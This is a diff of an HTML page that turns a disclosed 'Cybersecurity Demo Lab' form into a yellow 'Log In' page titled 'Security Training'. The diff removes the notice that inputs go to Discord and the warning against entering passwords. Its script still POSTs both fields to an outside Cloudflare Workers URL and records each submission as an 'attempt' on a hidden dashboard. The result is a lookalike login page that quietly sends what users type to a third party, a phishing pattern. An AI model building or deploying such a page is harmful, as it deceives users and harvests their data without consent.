@@ -4,7 +4,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Cybersecurity Demo Lab</title>
+<title>Security Training</title>
+
 <style>
 * { box-sizing: border-box; }
 
@@ -12,7 +13,7 @@ body {
   margin: 0;
   min-height: 100vh;
   font-family: Arial, sans-serif;
-  background: #f2f5fa;
+  background: #fffc00;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -23,170 +24,356 @@ body {
   background: white;
   width: 100%;
   max-width: 420px;
-  padding: 32px;
-  border-radius: 18px;
-  box-shadow: 0 12px 35px #00000012;
-}
-
-h1 {
-  text-align: center;
-  font-size: 24px;
+  padding: 36px 30px;
+  border-radius: 22px;
+  box-shadow: 0 14px 45px #00000015;
 }
 
 .subtitle {
   text-align: center;
   color: #666;
-  font-size: 13px;
+  font-size: 14px;
   line-height: 1.6;
 }
 
 label {
   display: block;
-  margin: 20px 0 8px;
-  font-size: 14px;
+  margin: 15px 0 7px;
+  font-size: 13px;
   font-weight: bold;
 }
 
 input {
   width: 100%;
   padding: 14px;
-  border: 1px solid #ccc;
-  border-radius: 9px;
+  border: 1px solid #ddd;
+  border-radius: 10px;
   font-size: 15px;
+  outline: none;
 }
 
-button {
+input:focus {
+  border-color: #b6a900;
+}
+
+.primary {
   width: 100%;
-  padding: 14px;
-  margin-top: 24px;
-  background: #2458e8;
-  color: white;
+  margin-top: 22px;
+  padding: 15px;
+  background: #fffc00;
+  color: #111;
   border: none;
-  border-radius: 9px;
+  border-radius: 30px;
   font-size: 15px;
+  font-weight: bold;
   cursor: pointer;
 }
 
+.primary:hover { background: #eee900; }
+
+.primary:disabled {
+  opacity: 0.6;
+  cursor: wait;
+}
+
+.secondary {
+  background: none;
+  border: none;
+  color: #444;
+  text-decoration: underline;
+  cursor: pointer;
+  margin-top: 18px;
+  width: 100%;
+  padding: 10px;
+}
+
 .result {
-  margin-top: 20px;
+  margin-top: 16px;
+  text-align: center;
   font-size: 14px;
-  line-height: 1.8;
+  line-height: 1.5;
   overflow-wrap: anywhere;
 }
 
-.note {
-  font-size: 12px;
-  color: #666;
+.hidden { display: none; }
+
+.stats {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+  margin: 20px 0;
+}
+
+.stat {
+  background: #f4f4f4;
+  border-radius: 12px;
+  padding: 15px;
   text-align: center;
+}
+
+.stat strong {
+  display: block;
+  font-size: 25px;
+  margin-bottom: 5px;
+}
+
+.stat span {
+  color: #666;
+  font-size: 12px;
+}
+
+.history {
+  max-height: 300px;
+  overflow-y: auto;
+}
+
+.entry {
+  padding: 12px;
+  border-bottom: 1px solid #eee;
+  font-size: 13px;
+  overflow-wrap: anywhere;
+}
+
+.entry small {
+  display: block;
+  margin-top: 5px;
+  color: #777;
+}
+
+.footer {
+  text-align: center;
+  font-size: 11px;
+  color: #777;
   margin-top: 20px;
+}
+
+h1 {
+  text-align: center;
+  font-size: 26px;
 }
 </style>
 </head>
+
 <body>
-
 <div class="container">
-  <h1>Cybersecurity Demo Lab</h1>
 
-  <p class="subtitle">
-    Enter two non-sensitive test usernames.
-    Both values will be sent to the demo Discord channel.
-  </p>
+  <section id="loginPage">
+    <p class="subtitle">
+      Enter two test usernames
+    </p>
 
-  <form id="demoForm">
-    <label for="username">Username</label>
-    <input
-      id="username"
-      type="text"
-      maxlength="40"
-      autocomplete="off"
-      required
-    >
+    <form id="loginForm">
+      <label for="username">Username</label>
+      <input
+        id="username"
+        type="text"
+        maxlength="40"
+        autocomplete="off"
+        required
+      >
 
-    <label for="username2">Username 2</label>
-    <input
-      id="username2"
-      type="text"
-      maxlength="40"
-      autocomplete="off"
-      required
-    >
+      <label for="username2">Username 2</label>
+      <input
+        id="username2"
+        type="text"
+        maxlength="40"
+        autocomplete="off"
+        required
+      >
 
-    <button type="submit" id="sendButton">
-      Send Demo
+      <button class="primary" type="submit" id="sendButton">
+        Log In
+      </button>
+    </form>
+
+    <div class="result" id="result"></div>
+
+    <button class="secondary" id="openDashboard">
+      View Training Results
     </button>
-  </form>
+  </section>
 
-  <div class="result" id="result"></div>
+  <section id="dashboard" class="hidden">
+    <h1>Training Dashboard</h1>
+    <p class="subtitle">Local demonstration results</p>
 
-  <p class="note">
-    Demo Only — Do not enter passwords or real credentials.
-  </p>
+    <div class="stats">
+      <div class="stat">
+        <strong id="total">0</strong>
+        <span>Total attempts</span>
+      </div>
+      <div class="stat">
+        <strong id="successful">0</strong>
+        <span>Sent demos</span>
+      </div>
+    </div>
+
+    <h3>Attempt History</h3>
+    <div id="history" class="history"></div>
+
+    <button class="primary" id="backButton">
+      Back to Login
+    </button>
+
+    <button class="secondary" id="clearButton">
+      Clear Local Results
+    </button>
+
+    <div class="footer">
+      Demo Only — No passwords collected.
+    </div>
+  </section>
+
 </div>
 
 <script>
+const STORAGE_KEY = "twoUsernameDemoAttempts";
+
 const WORKER_URL =
   "https://soft-wildflower-8b8f.gxdhdehdd.workers.dev/";
 
-const form = document.getElementById("demoForm");
+const loginPage = document.getElementById("loginPage");
+const dashboard = document.getElementById("dashboard");
 const result = document.getElementById("result");
 const sendButton = document.getElementById("sendButton");
 
-form.addEventListener("submit", async (event) => {
-  event.preventDefault();
+function getAttempts() {
+  try {
+    return JSON.parse(
+      localStorage.getItem(STORAGE_KEY) || "[]"
+    );
+  } catch {
+    return [];
+  }
+}
 
-  const username =
-    document.getElementById("username").value.trim();
+function saveAttempts(attempts) {
+  localStorage.setItem(
+    STORAGE_KEY,
+    JSON.stringify(attempts)
+  );
+}
 
-  const username2 =
-    document.getElementById("username2").value.trim();
+document.getElementById("loginForm")
+  .addEventListener("submit", async (event) => {
+    event.preventDefault();
 
-  if (!username || !username2) {
-    result.textContent = "Please enter both usernames.";
+    const username = document
+      .getElementById("username").value.trim();
+
+    const username2 = document
+      .getElementById("username2").value.trim();
+
+    if (!username || !username2) return;
+
+    sendButton.disabled = true;
+    result.textContent = "Sending...";
+    result.style.color = "#444";
+
+    try {
+      const response = await fetch(WORKER_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          event: "demo_usernames",
+          username: username,
+          username2: username2
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error("HTTP " + response.status);
+      }
+
+      const attempts = getAttempts();
+
+      attempts.unshift({
+        username: username,
+        username2: username2,
+        time: new Date().toLocaleString()
+      });
+
+      saveAttempts(attempts.slice(0, 100));
+
+      result.replaceChildren();
+
+      const first = document.createElement("div");
+      first.textContent = "Username: " + username;
+
+      const second = document.createElement("div");
+      second.textContent = "Username 2: " + username2;
+
+      const status = document.createElement("div");
+      status.textContent = "Sent successfully!";
+      status.style.color = "green";
+
+      result.append(first, second, status);
+
+    } catch (error) {
+      result.textContent =
+        "Sending failed. Check Cloudflare connection.";
+      result.style.color = "#b42318";
+      console.error(error);
+    } finally {
+      sendButton.disabled = false;
+    }
+  });
+
+function renderDashboard() {
+  const attempts = getAttempts();
+
+  document.getElementById("total")
+    .textContent = attempts.length;
+
+  document.getElementById("successful")
+    .textContent = attempts.length;
+
+  const history = document.getElementById("history");
+  history.replaceChildren();
+
+  if (!attempts.length) {
+    history.textContent = "No attempts recorded yet.";
     return;
   }
 
-  sendButton.disabled = true;
-  result.textContent = "Sending demo...";
+  attempts.forEach(a => {
+    const entry = document.createElement("div");
+    entry.className = "entry";
 
-  try {
-    const response = await fetch(WORKER_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        event: "demo_usernames",
-        username: username,
-        username2: username2
-      })
-    });
-
-    if (!response.ok) {
-      throw new Error("Request failed");
-    }
-
-    result.replaceChildren();
-
-    const first = document.createElement("div");
-    first.textContent = "Username: " + username;
+    const first = document.createElement("strong");
+    first.textContent = a.username;
 
     const second = document.createElement("div");
-    second.textContent = "Username 2: " + username2;
+    second.textContent = "Username 2: " + a.username2;
 
-    const status = document.createElement("div");
-    status.textContent = "Sent to Discord successfully!";
-    status.style.color = "green";
+    const time = document.createElement("small");
+    time.textContent = a.time;
 
-    result.append(first, second, status);
-  } catch (error) {
-    result.textContent =
-      "Could not send the demo. Check the Worker settings.";
-    result.style.color = "#b42318";
-  } finally {
-    sendButton.disabled = false;
-  }
-});
+    entry.append(first, second, time);
+    history.appendChild(entry);
+  });
+}
+
+document.getElementById("openDashboard")
+  .addEventListener("click", () => {
+    renderDashboard();
+    loginPage.classList.add("hidden");
+    dashboard.classList.remove("hidden");
+  });
+
+document.getElementById("backButton")
+  .addEventListener("click", () => {
+    dashboard.classList.add("hidden");
+    loginPage.classList.remove("hidden");
+  });
+
+document.getElementById("clearButton")
+  .addEventListener("click", () => {
+    localStorage.removeItem(STORAGE_KEY);
+    renderDashboard();
+  });
 </script>
-
 </body>
 </html>
